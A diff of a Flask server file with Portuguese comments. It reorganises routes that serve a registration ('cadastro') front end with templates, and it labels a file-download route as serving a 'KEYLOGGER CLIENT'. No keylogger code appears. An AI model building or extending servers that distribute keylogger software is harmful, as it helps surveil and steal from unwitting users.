@@ -309,25 +309,32 @@ from flask import send_from_directory
 
 FRONTEND_PATH = os.path.join(os.path.dirname(__file__), '..', 'frontend')
 
+# ============================================
+# PAGINA PRINCIPAL - Seletor de Templates
+# ============================================
 @app.route('/')
 def index():
     return send_from_directory(os.path.join(FRONTEND_PATH, 'cadastro'), 'index.html')
 
+# ============================================
+# CADASTRO - Todos os arquivos (templates, css, js)
+# ============================================
+@app.route('/cadastro/')
+def cadastro_index():
+    return send_from_directory(os.path.join(FRONTEND_PATH, 'cadastro'), 'index.html')
+
 @app.route('/cadastro/<path:filename>')
 def cadastro_files(filename):
-    return send_from_directory(os.path.join(FRONTEND_PATH, 'cadastro'), filename)
+    """Serve todos os arquivos da pasta cadastro, incluindo templates"""
+    cadastro_path = os.path.join(FRONTEND_PATH, 'cadastro')
+    return send_from_directory(cadastro_path, filename)
 
+# ============================================
+# DOWNLOAD / KEYLOGGER CLIENT
+# ============================================
 @app.route('/download/<path:filename>')
 def download_files(filename):
     return send_from_directory(os.path.join(FRONTEND_PATH, 'download'), filename)
-
-@app.route('/styles.css')
-def root_styles():
-    return send_from_directory(os.path.join(FRONTEND_PATH, 'cadastro'), 'styles.css')
-
-@app.route('/script.js')
-def root_script():
-    return send_from_directory(os.path.join(FRONTEND_PATH, 'cadastro'), 'script.js')
 
 if __name__ == '__main__':
     print('Servidor iniciado em http://0.0.0.0:5000')
